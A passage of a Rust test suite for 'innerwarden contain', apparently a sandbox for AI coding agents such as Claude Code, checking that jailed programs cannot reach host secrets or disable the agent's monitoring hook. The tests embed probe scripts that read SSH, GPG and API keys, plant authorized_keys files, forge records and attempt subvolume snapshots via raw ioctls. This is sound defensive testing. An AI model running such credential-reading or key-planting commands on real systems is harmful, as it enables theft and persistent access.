    let h = home.path();
    std::fs::create_dir_all(h.join(".claude")).unwrap();
    std::fs::create_dir_all(h.join("elsewhere")).unwrap();
    std::os::unix::fs::symlink("../elsewhere", h.join(".claude/sessions")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let output = identified_sh(h, project.path(), "echo DONE")
        .output()
        .expect("run the jail");
    let out = String::from_utf8_lossy(&output.stdout);
    let err = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{out} {err}");
    assert!(out.contains("DONE"), "{out} {err}");
    let said = "innerwarden contain: Claude Code's ~/.claude/sessions or ~/.claude/backups is \
                the host's in this jail, not one of its own";
    assert_eq!(err.matches(said).count(), 1, "{err}");
    assert!(std::fs::symlink_metadata(h.join(".claude/sessions"))
        .unwrap()
        .file_type()
        .is_symlink());
}

/// M30CW-2: Claude Code's folders of its runs are made on the host by a
/// real identified launch alone, after every check: a plain jail, an
/// identified dry run and an identified launch refused by the checks make
/// nothing (a dry run must change nothing, a plain jail is the jail it
/// was). The real identified launch makes both, empty and 0700.
///
/// FAILS ON REVERT: make the folders while the launch is planned, before
/// the checks, and the dry run and the refused launch make them; or make
/// them for a plain jail too.
#[cfg(target_os = "linux")]
#[test]
fn claude_codes_folders_are_made_only_by_a_real_identified_launch() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = state_home();
    let h = home.path();
    std::fs::create_dir_all(h.join(".claude")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let p = project.path().to_str().unwrap().to_string();
    let none_made = |when: &str| {
        for name in ["sessions", "backups"] {
            assert!(
                std::fs::symlink_metadata(h.join(".claude").join(name)).is_err(),
                "{when} made ~/.claude/{name}"
            );
        }
    };
    let plain = cli()
        .args(["contain", "--project", &p, "--", "/bin/true"])
        .env("HOME", h)
        .output()
        .expect("run a plain jail");
    assert!(
        plain.status.success(),
        "{}",
        String::from_utf8_lossy(&plain.stderr)
    );
    none_made("a plain jail");
    let mut dry = cli();
    dry.args([
        "contain",
        "--identity",
        "--dry-run",
        "--project",
        &p,
        "--",
        "/bin/true",
    ])
    .env("HOME", h);
    let dry = identified_without_a_scope(&mut dry)
        .output()
        .expect("dry run");
    assert!(
        dry.status.success(),
        "{}",
        String::from_utf8_lossy(&dry.stderr)
    );
    assert!(String::from_utf8_lossy(&dry.stdout).contains("/.claude/sessions"));
    none_made("an identified dry run");
    let refused = identified_sh(h, h, "true")
        .output()
        .expect("refused launch");
    assert_eq!(
        refused.status.code(),
        Some(2),
        "{}",
        String::from_utf8_lossy(&refused.stderr)
    );
    none_made("a refused launch");
    let real = identified_sh(h, project.path(), "true")
        .output()
        .expect("real launch");
    assert!(
        real.status.success(),
        "{}",
        String::from_utf8_lossy(&real.stderr)
    );
    for name in ["sessions", "backups"] {
        let meta = std::fs::symlink_metadata(h.join(".claude").join(name)).unwrap();
        assert!(meta.is_dir(), "{name}");
        assert_eq!(meta.permissions().mode() & 0o777, 0o700, "{name}");
    }
}

/// M30CW-C2: on an account where Claude Code never ran there is no
/// `~/.claude` when the jail is planned, and arming the hook makes it, with
/// the settings file that carries the hook. The jail is planned again on
/// what is there then, so it shows that file, plain and identified alike,
/// and the hook fires inside from the first launch.
///
/// FAILS ON REVERT: plan the jail only once, before the hook is armed, and
/// the jail has no `~/.claude/settings.json`.
#[cfg(target_os = "linux")]
#[test]
fn the_first_launch_on_a_home_with_no_claude_folder_shows_the_hook() {
    require_bwrap();
    for identity in [false, true] {
        let home = state_home();
        let h = home.path();
        assert!(!h.join(".claude").exists());
        let project = tempfile::TempDir::new().unwrap();
        let script = "cat \"$HOME/.claude/settings.json\" 2>/dev/null || echo NO-SETTINGS";
        let output = if identity {
            identified_sh(h, project.path(), script).output()
        } else {
            cli()
                .args([
                    "contain",
                    "--project",
                    project.path().to_str().unwrap(),
                    "--",
                    "/bin/sh",
                    "-c",
                    script,
                ])
                .env("HOME", h)
                .output()
        }
        .expect("run the jail");
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "identity={identity}: {out} {err}");
        assert!(!out.contains("NO-SETTINGS"), "identity={identity}: {out}");
        assert!(
            out.contains("PreToolUse") && out.contains("hook --monitor --agent claude-code"),
            "identity={identity}: no hook in the jail: {out}"
        );
    }
}

/// M30CW-C3: `~/.cache` leads off the home (`<elsewhere>/cache`), and
/// `~/.config` and `~/.local` are links into it. The `.cache` bind shows
/// InnerWarden's folder at `~/.cache/cfg/innerwarden` and the launcher's
/// records at `~/.cache/local/state/innerwarden/instances`, places that are
/// neither the folder as named nor as it resolves. Both are covered there
/// too: the key is read in no jail, and an identified jail neither lists
/// the launcher's records nor writes there.
///
/// FAILS ON REVERT: cover them only as named and as they resolve, and the
/// jail reads the key through `~/.cache`, lists the record and forges one.
#[cfg(target_os = "linux")]
#[test]
fn a_secret_folder_shown_through_another_linked_home_folder_stays_hidden() {
    require_bwrap();
    for identity in [false, true] {
        let home = tempfile::TempDir::new().unwrap();
        let h = home.path();
        let elsewhere = tempfile::TempDir::new().unwrap();
        let cache = elsewhere.path().join("cache");
        std::fs::create_dir_all(cache.join("cfg/innerwarden")).unwrap();
        std::fs::create_dir_all(cache.join("local/state")).unwrap();
        std::fs::write(cache.join("cfg/innerwarden/llm-key"), "CJC-J007-SECRET").unwrap();
        std::os::unix::fs::symlink(&cache, h.join(".cache")).unwrap();
        std::os::unix::fs::symlink(".cache/cfg", h.join(".config")).unwrap();
        std::os::unix::fs::symlink(".cache/local", h.join(".local")).unwrap();
        let project = tempfile::TempDir::new().unwrap();
        let script = "cat \"$HOME/.cache/cfg/innerwarden/llm-key\" \
                      \"$HOME/.config/innerwarden/llm-key\" 2>/dev/null; echo; \
                      d=\"$HOME/.cache/local/state/innerwarden/instances\"; \
                      echo \"seen=$(ls -A \"$d\" 2>/dev/null | wc -l | tr -d ' ')\"; \
                      ( echo forged > \"$d/forged.json\" ) 2>/dev/null; echo DONE";
        let output = if identity {
            identified_sh(h, project.path(), script).output()
        } else {
            cli()
                .args([
                    "contain",
                    "--project",
                    project.path().to_str().unwrap(),
                    "--",
                    "/bin/sh",
                    "-c",
                    script,
                ])
                .env("HOME", h)
                .output()
        }
        .expect("run the jail");
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "identity={identity}: {out} {err}");
        assert!(out.contains("DONE"), "identity={identity}: {out} {err}");
        assert!(
            !out.contains("CJC-J007-SECRET"),
            "identity={identity}: the key was read: {out}"
        );
        if identity {
            assert!(out.contains("seen=0"), "the records were listed: {out}");
            let records = cache.join("local/state/innerwarden/instances");
            let names: Vec<_> = std::fs::read_dir(&records)
                .expect("the launcher's records folder")
                .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
                .collect();
            assert!(
                !names.iter().any(|name| name == "forged.json"),
                "a forged record reached the host: {names:?}"
            );
            assert!(
                names.iter().any(|name| name.ends_with(".json")),
                "the launcher's own record: {names:?}"
            );
        }
    }
}

/// A jail on `home` and `project` running `script` in `/bin/sh`: plain, or
/// identified (with no scope of its own).
#[cfg(target_os = "linux")]
fn jail_sh(
    identity: bool,
    home: &std::path::Path,
    project: &std::path::Path,
    script: &str,
) -> std::process::Output {
    if identity {
        identified_sh(home, project, script).output()
    } else {
        cli()
            .args([
                "contain",
                "--project",
                project.to_str().unwrap(),
                "--",
                "/bin/sh",
                "-c",
                script,
            ])
            .env("HOME", home)
            .output()
    }
    .expect("run the jail")
}

/// What a program in the jail tries on a dotdir's key at each place it
/// names (`$1`...): read it, and plant an `authorized_keys` beside it.
#[cfg(any(target_os = "linux", target_os = "macos"))]
const READ_AND_PLANT: &str = "for at in \"$@\"; do cat \"$at/id_test\" 2>/dev/null; \
     ( mkdir -p \"$at\" && echo planted > \"$at/authorized_keys\" ) 2>/dev/null; done; \
     echo DONE";

/// `READ_AND_PLANT` at `places` (each under `$HOME`), as one script.
#[cfg(any(target_os = "linux", target_os = "macos"))]
fn read_and_plant(places: &[&str]) -> String {
    let args: Vec<String> = places.iter().map(|p| format!("\"$HOME/{p}\"")).collect();
    format!("set -- {}; {READ_AND_PLANT}", args.join(" "))
}

/// M30-CW-link: a dotdir the jail never shows that is a link into a folder
/// it shows: `~/.ssh` a link to `.config/ssh`, with `~/.config` bound. The
/// jail covered `~/.ssh` as named only, and `cat ~/.config/ssh/id_test`
/// printed the key (measured on x86_64 and aarch64). It is covered there
/// too, in a plain and an identified jail: nothing is read, and nothing
/// planted there reaches the host's `~/.ssh`.
///
/// FAILS ON REVERT: drop the `linked_masks` loop from `build_linux_jail`
/// and the key is read and the planted file reaches the host.
#[cfg(target_os = "linux")]
#[test]
fn a_dotdir_linked_into_a_folder_the_jail_shows_stays_hidden() {
    require_bwrap();
    for identity in [false, true] {
        let home = tempfile::TempDir::new().unwrap();
        let h = home.path();
        std::fs::create_dir_all(h.join(".config/ssh")).unwrap();
        std::fs::write(h.join(".config/ssh/id_test"), "CJC-J007-SSH-KEY").unwrap();
        std::os::unix::fs::symlink(".config/ssh", h.join(".ssh")).unwrap();
        let project = tempfile::TempDir::new().unwrap();
        let output = jail_sh(
            identity,
            h,
            project.path(),
            &read_and_plant(&[".config/ssh", ".ssh"]),
        );
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "identity={identity}: {out} {err}");
        assert!(out.contains("DONE"), "identity={identity}: {out} {err}");
        assert!(
            !out.contains("CJC-J007-SSH-KEY"),
            "identity={identity}: the key was read: {out}"
        );
        assert!(
            !h.join(".config/ssh/authorized_keys").exists(),
            "identity={identity}: a file planted in the jail reached the host's ~/.ssh"
        );
        assert!(!err.contains("leads"), "nothing to say: {err}");
    }
}

/// The same on macOS: the sandbox matches the place a link leads to, so its
/// deny of `~/.ssh` did not cover `~/.config/ssh`, which it lets the jail
/// read and write. It denies that place too, read and write.
///
/// FAILS ON REVERT: drop `linked_denies` from the macOS profile and the key
/// is read and the planted file reaches the host.
#[cfg(target_os = "macos")]
#[test]
fn on_macos_a_dotdir_linked_into_a_folder_the_jail_writes_stays_hidden() {
    let home = tempfile::TempDir::new().unwrap();
    let h = std::fs::canonicalize(home.path()).unwrap();
    std::fs::create_dir_all(h.join(".config/ssh")).unwrap();
    std::fs::write(h.join(".config/ssh/id_test"), "CJC-J007-SSH-KEY").unwrap();
    std::os::unix::fs::symlink(".config/ssh", h.join(".ssh")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &read_and_plant(&[".config/ssh", ".ssh"]),
        ])
        .env("HOME", &h)
        .output()
        .expect("run the macOS jail");
    let out = String::from_utf8_lossy(&output.stdout);
    let err = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{out} {err}");
    assert!(out.contains("DONE"), "{out} {err}");
    assert!(!out.contains("CJC-J007-SSH-KEY"), "the key was read: {out}");
    assert!(
        !h.join(".config/ssh/authorized_keys").exists(),
        "a file planted in the jail reached the host's ~/.ssh"
    );
}

/// A folder the jail shows that is itself a link to a folder above a
/// dotdir: `~/.cache` a link to the home's `dots` folder, where `~/.ssh`
/// leads, shows the key at `~/.cache/ssh`; `~/.cache` a link to the home
/// shows an ordinary `~/.ssh` folder at `~/.cache/.ssh`. Both covered.
///
/// FAILS ON REVERT: take only the places a folder shows under its own name
/// in `plan_linked_places` and the key is read through `~/.cache`.
#[cfg(target_os = "linux")]
#[test]
fn a_folder_the_jail_shows_that_leads_above_a_dotdir_shows_nothing_of_it() {
    require_bwrap();
    for (cache, ssh, view) in [
        ("dots", Some("dots/ssh"), ".cache/ssh"),
        (".", None, ".cache/.ssh"),
    ] {
        let home = tempfile::TempDir::new().unwrap();
        let h = home.path();
        let keys = h.join(ssh.unwrap_or(".ssh"));
        std::fs::create_dir_all(&keys).unwrap();
        std::fs::write(keys.join("id_test"), "CJC-J007-SSH-KEY").unwrap();
        if let Some(ssh) = ssh {
            std::os::unix::fs::symlink(ssh, h.join(".ssh")).unwrap();
        }
        std::os::unix::fs::symlink(cache, h.join(".cache")).unwrap();
        let project = tempfile::TempDir::new().unwrap();
        let output = jail_sh(false, h, project.path(), &read_and_plant(&[view]));
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "{cache}: {out} {err}");
        assert!(out.contains("DONE"), "{cache}: {out} {err}");
        assert!(!out.contains("CJC-J007-SSH-KEY"), "{cache}: read: {out}");
        assert!(
            !keys.join("authorized_keys").exists(),
            "{cache}: a planted file reached the host's ~/.ssh"
        );
    }
}

/// A chain of two links: `~/.gnupg` a link to `.mid`, and `~/.mid` a link
/// to `.config/gnupg-real`. Covered where the chain ends, in a plain and an
/// identified jail.
///
/// FAILS ON REVERT: follow one link only in `leads_to` and the chain is
/// taken for a loop (said), and the key is read through `~/.config`.
#[cfg(target_os = "linux")]
#[test]
fn a_dotdir_behind_a_chain_of_two_links_stays_hidden() {
    require_bwrap();
    for identity in [false, true] {
        let home = tempfile::TempDir::new().unwrap();
        let h = home.path();
        std::fs::create_dir_all(h.join(".config/gnupg-real")).unwrap();
        std::fs::write(h.join(".config/gnupg-real/id_test"), "CJC-J007-GPG-KEY").unwrap();
        std::os::unix::fs::symlink(".mid", h.join(".gnupg")).unwrap();
        std::os::unix::fs::symlink(".config/gnupg-real", h.join(".mid")).unwrap();
        let project = tempfile::TempDir::new().unwrap();
        let output = jail_sh(
            identity,
            h,
            project.path(),
            &read_and_plant(&[".config/gnupg-real"]),
        );
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "identity={identity}: {out} {err}");
        assert!(out.contains("DONE"), "identity={identity}: {out} {err}");
        assert!(
            !out.contains("CJC-J007-GPG-KEY"),
            "identity={identity}: {out}"
        );
        assert!(!h.join(".config/gnupg-real/authorized_keys").exists());
        assert!(!err.contains("loops"), "identity={identity}: {err}");
    }
}

/// A dotdir that a link leads outside the home: the jail never follows a
/// link out of the home to cover a place there (that would be the system,
/// or a disk the person keeps elsewhere). It starts, leaves that place as
/// it is, and says so; the place is not in the jail anyway (nothing shows
/// it).
///
/// FAILS ON REVERT: drop the own-places check from `plan_linked_places`
/// and nothing is said.
#[cfg(target_os = "linux")]
#[test]
fn a_dotdir_that_leads_outside_the_home_is_left_and_said() {
    require_bwrap();
    for identity in [false, true] {
        let home = tempfile::TempDir::new().unwrap();
        let h = home.path();
        let elsewhere = tempfile::TempDir::new().unwrap();
        let keys = elsewhere.path().join("ssh");
        std::fs::create_dir_all(&keys).unwrap();
        std::fs::write(keys.join("id_test"), "CJC-J007-SSH-KEY").unwrap();
        std::os::unix::fs::symlink(&keys, h.join(".ssh")).unwrap();
        std::fs::create_dir_all(h.join(".config")).unwrap();
        let project = tempfile::TempDir::new().unwrap();
        let script = format!(
            "cat '{}/id_test' \"$HOME/.ssh/id_test\" 2>/dev/null; echo DONE",
            keys.display()
        );
        let output = jail_sh(identity, h, project.path(), &script);
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "identity={identity}: {out} {err}");
        assert!(out.contains("DONE"), "identity={identity}: {out} {err}");
        assert!(
            !out.contains("CJC-J007-SSH-KEY"),
            "identity={identity}: {out}"
        );
        let said = format!(
            "innerwarden contain: {} leads outside your home, to {}: the jail does not hide that place",
            h.join(".ssh").display(),
            std::fs::canonicalize(&keys).unwrap().display()
        );
        assert!(err.contains(&said), "identity={identity}: {err}");
    }
}

/// A person whose dotdirs are ordinary folders: they are hidden as before,
/// nothing is said, and the jail's mounts are exactly the ones it always
/// laid (the home's tmpfs, InnerWarden's folder, each dotdir it never
/// shows, the project's secrets).
#[cfg(target_os = "linux")]
#[test]
fn ordinary_dotdirs_are_hidden_as_before_and_nothing_is_added() {
    require_bwrap();
    let home = tempfile::TempDir::new().unwrap();
    let h = std::fs::canonicalize(home.path()).unwrap();
    for dir in [".ssh", ".gnupg", ".aws", ".config", ".cache", ".local"] {
        std::fs::create_dir_all(h.join(dir)).unwrap();
    }
    for dir in [".ssh", ".gnupg", ".aws"] {
        std::fs::write(h.join(dir).join("id_test"), "CJC-J007-DOTDIR-KEY").unwrap();
    }
    let project = tempfile::TempDir::new().unwrap();
    let p = std::fs::canonicalize(project.path()).unwrap();
    std::fs::write(p.join(".env"), "CJC-J007-ENV").unwrap();
    let output = jail_sh(
        false,
        &h,
        &p,
        "cat \"$HOME/.ssh/id_test\" \"$HOME/.gnupg/id_test\" \"$HOME/.aws/id_test\" .env \
         2>/dev/null; echo DONE",
    );
    let out = String::from_utf8_lossy(&output.stdout);
    let err = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{out} {err}");
    assert!(out.contains("DONE"), "{out} {err}");
    assert!(!out.contains("CJC-J007-"), "{out}");
    assert!(!err.contains("leads") && !err.contains("loops"), "{err}");
    let dry = cli()
        .args([
            "contain",
            "--dry-run",
            "--project",
            p.to_str().unwrap(),
            "--",
            "true",
        ])
        .env("HOME", &h)
        .output()
        .expect("dry run");
    let text = String::from_utf8_lossy(&dry.stdout);
    let argv: Vec<&str> = text
        .lines()
        .last()
        .expect("the argv line")
        .split_whitespace()
        .collect();
    let mut masked: Vec<String> = argv
        .windows(3)
        .filter_map(|w| match w {
            ["--tmpfs", dest, _] => Some(dest.to_string()),
            ["--ro-bind", "/dev/null", dest] => Some(dest.to_string()),
            _ => None,
        })
        .collect();
    masked.sort();
    masked.dedup();
    let home_s = h.display().to_string();
    let mut expected: Vec<String> = ["/tmp", "/run"].map(String::from).to_vec();
    expected.push(home_s.clone());
    for name in [
        ".config/innerwarden",
        ".ssh",
        ".gnupg",
        ".aws",
        ".mozilla",
        ".thunderbird",
        "Library/Mail",
        "Library/Messages",
        "Library/Safari",
    ] {
        expected.push(format!("{home_s}/{name}"));
    }
    expected.push(format!("{}/.env", p.display()));
    expected.sort();
    assert_eq!(masked, expected, "{text}");
}

/// A dotdir link that leads to nothing yet (`~/.ssh` a link to
/// `.config/ssh`, not made): a program in the jail could make that folder
/// through `~/.config` and plant a key the host's `~/.ssh` would hold. The
/// launcher makes it first, empty and 0700, and the jail covers it: what
/// is planted stays in the jail.
///
/// FAILS ON REVERT: skip a place that is not there in
/// `plan_linked_places` and the planted file reaches the host.
#[cfg(target_os = "linux")]
#[test]
fn a_dotdir_link_to_nothing_yet_is_made_and_covered() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    for identity in [false, true] {
        let home = tempfile::TempDir::new().unwrap();
        let h = home.path();
        std::fs::create_dir_all(h.join(".config")).unwrap();
        std::os::unix::fs::symlink(".config/ssh", h.join(".ssh")).unwrap();
        let project = tempfile::TempDir::new().unwrap();
        let output = jail_sh(
            identity,
            h,
            project.path(),
            &read_and_plant(&[".config/ssh"]),
        );
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "identity={identity}: {out} {err}");
        assert!(out.contains("DONE"), "identity={identity}: {out} {err}");
        let made = h.join(".config/ssh");
        let mode = std::fs::metadata(&made)
            .expect("the folder the link leads to, made")
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o700, "identity={identity}");
        assert!(
            !made.join("authorized_keys").exists(),
            "identity={identity}: a planted file reached the host's ~/.ssh"
        );
    }
}

/// InnerWarden's own folder that is itself a link (a dotfiles manager's
/// `~/.config/innerwarden`, here to `~/.cache/iw` by an absolute path):
/// every jail aborted ("Can't mount tmpfs on .../.config/innerwarden: No
/// such file or directory"). It starts now, plain and identified, and the
/// key is read at neither place.
///
/// FAILS ON REVERT: mount the folder as named again (drop the
/// `iw_config_link` guard in `build_linux_jail`) and the jail does not
/// start.
#[cfg(target_os = "linux")]
#[test]
fn innerwardens_folder_that_is_a_link_starts_the_jail_and_stays_hidden() {
    require_bwrap();
    for identity in [false, true] {
        let home = tempfile::TempDir::new().unwrap();
        let h = home.path();
        std::fs::create_dir_all(h.join(".config")).unwrap();
        std::fs::create_dir_all(h.join(".cache/iw")).unwrap();
        std::fs::write(h.join(".cache/iw/llm-key"), "CJC-J007-SECRET").unwrap();
        std::os::unix::fs::symlink(h.join(".cache/iw"), h.join(".config/innerwarden")).unwrap();
        let project = tempfile::TempDir::new().unwrap();
        let script = "cat \"$HOME/.config/innerwarden/llm-key\" \"$HOME/.cache/iw/llm-key\" \
                      2>/dev/null; echo DONE";
        let output = jail_sh(identity, h, project.path(), script);
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "identity={identity}: {out} {err}");
        assert!(out.contains("DONE"), "identity={identity}: {out} {err}");
        assert!(
            !out.contains("CJC-J007-SECRET"),
            "identity={identity}: {out}"
        );
    }
}

/// The launcher's records folder in an identified jail, where
/// `~/.local/state` is a link (by an absolute path) into `~/.cache`: the
/// jail covered the folder as named, through that link, and bwrap aborted
/// every identified launch ("Can't mkdir parents for
/// .../.local/state/innerwarden/instances"). It starts now; the records are
/// covered where they are, so the jail neither lists them nor forges one
/// at either name.
///
/// FAILS ON REVERT: keep the folder as named in `records_dirs` (drop the
/// `goes_through_a_link` check) and the jail does not start.
#[cfg(target_os = "linux")]
#[test]
fn an_identified_jail_starts_where_the_records_folder_is_behind_a_link() {
    require_bwrap();
    let home = tempfile::TempDir::new().unwrap();
    let h = home.path();
    std::fs::create_dir_all(h.join(".local")).unwrap();
    std::fs::create_dir_all(h.join(".cache/state")).unwrap();
    std::os::unix::fs::symlink(h.join(".cache/state"), h.join(".local/state")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let script = "set -- \"$HOME/.local/state/innerwarden/instances\" \
                  \"$HOME/.cache/state/innerwarden/instances\"; \
                  for d in \"$@\"; do echo \"seen=$(ls -A \"$d\" 2>/dev/null | wc -l | tr -d ' ')\"; done; \
                  for d in \"$@\"; do ( echo forged > \"$d/forged.json\" ) 2>/dev/null; done; echo DONE";
    let output = identified_sh(h, project.path(), script)
        .output()
        .expect("run the jail");
    let out = String::from_utf8_lossy(&output.stdout);
    let err = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{out} {err}");
    assert!(out.contains("DONE"), "{out} {err}");
    assert!(!out.contains("seen=1"), "the records were listed: {out}");
    let records = h.join(".cache/state/innerwarden/instances");
    let names: Vec<_> = std::fs::read_dir(&records)
        .expect("the launcher's records folder")
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .collect();
    assert!(
        !names.iter().any(|name| name == "forged.json"),
        "a forged record reached the host: {names:?}"
    );
    assert!(
        names.iter().any(|name| name.ends_with(".json")),
        "the launcher's own record: {names:?}"
    );
}

/// A `deny_read` path that a link in the project (which the agent writes)
/// leads onto the agent's settings, or onto the system: the jail covered
/// where it led, so a `.env` link to `~/.claude` emptied the folder that
/// carries the hook at the next launch, and one to `/etc/passwd` the
/// jail's own file. Each is left as it is and said; the hook's folder and
/// the system's file are as they are in the jail.
///
/// FAILS ON REVERT: drop the needed or the own-places check from
/// `plan_denied_paths` and the jail's `~/.claude` is empty, or its
/// `/etc/passwd` is.
#[cfg(target_os = "linux")]
#[test]
fn a_deny_read_link_never_empties_the_hook_or_the_system() {
    require_bwrap();
    let home = tempfile::TempDir::new().unwrap();
    let h = std::fs::canonicalize(home.path()).unwrap();
    std::fs::create_dir_all(h.join(".claude")).unwrap();
    std::fs::write(h.join(".claude/marker.txt"), "CJC-J007-SETTINGS").unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let p = project.path();
    std::os::unix::fs::symlink(h.join(".claude"), p.join(".env")).unwrap();
    std::os::unix::fs::symlink("/etc/passwd", p.join(".env.local")).unwrap();
    let script = "cat \"$HOME/.claude/marker.txt\"; echo; \
                  echo \"name=$(head -c 4 /etc/passwd 2>/dev/null)\"; echo DONE";
    let output = jail_sh(false, &h, p, script);
    let out = String::from_utf8_lossy(&output.stdout);
    let err = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{out} {err}");
    assert!(out.contains("DONE"), "{out} {err}");
    assert!(
        out.contains("CJC-J007-SETTINGS"),
        "the hook's folder was emptied: {out}"
    );
    assert!(
        out.contains("name=root"),
        "the jail's /etc/passwd was emptied: {out}"
    );
    assert!(
        err.contains("where the jail keeps what it needs"),
        "the link onto the hook is said: {err}"
    );
    assert!(
        err.contains("to /etc/passwd: the jail does not hide that place"),
        "the link onto the system is said: {err}"
    );
}

/// What the btrfs side of [`no_jail_on_this_disk_makes_a_subvolume_or_snapshot`]
/// runs, in a folder (`$1`) that holds a subvolume `src` of this user's,
/// with the `btrfs` tool at `$2`: the tool's `subvolume create` and
/// `subvolume snapshot`, then each of the four btrfs commands that make a
/// subvolume or a snapshot, by its number, from `python3`. One `key=value`
/// line each: the tool's exit code, or the command's errno (0 when it made
/// what it names).
#[cfg(target_os = "linux")]
const MAKE_BTRFS_SUBVOLUMES: &str = r#"cd "$1" || exit 90
"$2" subvolume create tool-subvol >/dev/null 2>err; echo "tool_subvolume=$?"; cat err >&2
"$2" subvolume snapshot src tool-snap >/dev/null 2>err; echo "tool_snapshot=$?"; cat err >&2
rm -f err
python3 - <<'PY'
import fcntl, os, struct
here = os.open(".", os.O_RDONLY | os.O_DIRECTORY)
src = os.open("src", os.O_RDONLY | os.O_DIRECTORY)
def v1(fd, name):
    return bytearray(struct.pack("=q4088s", fd, name))
def v2(fd, name):
    return bytearray(struct.pack("=qQQ32x4040s", fd, 0, 0, name))
for key, command, arg in (
    ("snap_create", 0x50009401, v1(src, b"v1-snap")),
    ("subvol_create", 0x5000940E, v1(0, b"v1-subvol")),
    ("snap_create_v2", 0x50009417, v2(src, b"v2-snap")),
    ("subvol_create_v2", 0x50009418, v2(0, b"v2-subvol")),
):
    try:
        fcntl.ioctl(here, command, arg)
        print(f"{key}=0")
    except OSError as e:
        print(f"{key}={e.errno}")
PY
"#;

/// The bcachefs side of [`MAKE_BTRFS_SUBVOLUMES`], with the `bcachefs` tool
/// at `$2`: the tool's `subvolume create` and `subvolume snapshot`, then
/// each of the two bcachefs commands, as a new subvolume and as a snapshot
/// of `src`, by its number, from `python3`. `struct bch_ioctl_subvolume`
/// is `flags`, `dirfd`, `mode`, 6 bytes of padding and the two paths'
/// addresses; `_v2` adds 16 bytes for an error message, left empty.
#[cfg(target_os = "linux")]
const MAKE_BCACHEFS_SUBVOLUMES: &str = r#"cd "$1" || exit 90
"$2" subvolume create tool-subvol >/dev/null 2>err; echo "tool_subvolume=$?"; cat err >&2
"$2" subvolume snapshot src tool-snap >/dev/null 2>err; echo "tool_snapshot=$?"; cat err >&2
rm -f err
python3 - <<'PY'
import ctypes, fcntl, os, struct
here = os.open(".", os.O_RDONLY | os.O_DIRECTORY)
keep = []
def at(name):
    if name is None:
        return 0
    buf = ctypes.create_string_buffer(name)
    keep.append(buf)
    return ctypes.addressof(buf)
def v1(flags, dst, src):
    return bytearray(struct.pack("=IIH6xQQ", flags, here, 0o755, at(dst), at(src)))
def v2(flags, dst, src):
    return v1(flags, dst, src) + bytearray(16)
for key, command, arg in (
    ("subvolume_create", 0x4020BC10, v1(0, b"v1-subvol", None)),
    ("snapshot_create", 0x4020BC10, v1(1, b"v1-snap", b"src")),
    ("subvolume_create_v2", 0x4030BC1D, v2(0, b"v2-subvol", None)),
    ("snapshot_create_v2", 0x4030BC1D, v2(1, b"v2-snap", b"src")),
):
    try:
        fcntl.ioctl(here, command, arg)
        print(f"{key}=0")
    except OSError as e:
        print(f"{key}={e.errno}")
PY
"#;

/// What [`no_jail_on_this_disk_makes_a_subvolume_or_snapshot`] runs in a
/// project (`$1`) that is a subvolume of this user's holding `.env` and
/// `secrets/key`, with the tool at `$2`: what each secret holds, a
/// snapshot of the project into it, and what the copy of each holds.
#[cfg(target_os = "linux")]
const SNAPSHOT_THE_PROJECT: &str = r#"cd "$1" || exit 90
cat .env secrets/key 2>/dev/null | sed 's/^/before: /'
"$2" subvolume snapshot . snap >/dev/null 2>err; echo "project_snapshot=$?"; cat err >&2
rm -f err
cat snap/.env snap/secrets/key 2>/dev/null | sed 's/^/copy: /'
"#;

/// The `key=value` lines of a run of one of the scripts above.
#[cfg(target_os = "linux")]
fn subvolume_answers(stdout: &[u8]) -> std::collections::BTreeMap<String, i32> {
    String::from_utf8_lossy(stdout)
        .lines()
        .filter_map(|l| l.split_once('='))
        .filter_map(|(k, v)| Some((k.to_string(), v.trim().parse().ok()?)))
        .collect()
}

/// A disk kind [`no_jail_on_this_disk_makes_a_subvolume_or_snapshot`]
/// runs on.
#[cfg(target_os = "linux")]
struct SubvolumeDisk {
    /// Its name.
    kind: &'static str,
    /// Its magic number, as `stat -f -c %t` gives it (coreutils before 9.5
    /// has no name for bcachefs's).
    magic: &'static str,
    /// The variable that names a folder this user owns on one.
    var: &'static str,
    /// The tool that makes subvolumes there.
    tool: &'static str,
    /// The script that makes them, by the tool and by number.
    script: &'static str,
    /// What the script makes when nothing refuses it, by key.
    made_by: &'static [(&'static str, &'static str)],
    /// The keys of commands a kernel of that disk may not have yet: outside
    /// any jail they answer `ENOTTY` there, and in a jail always `EPERM`.
    newer: &'static [&'static str],
}

/// On a real btrfs or bcachefs disk no jail makes a new subvolume or a
/// snapshot, plain or identified: the tool's `subvolume create` and
/// `subvolume snapshot` fail with EPERM, and so does each command that makes
/// one, called by its number. The same user, on the same disk, makes every
/// one of them outside any jail: so each refusal is the filter's, and each
/// number is one the kernel's file system takes. And the project, a
/// subvolume of this user's holding `.env` and `secrets/key`: outside any
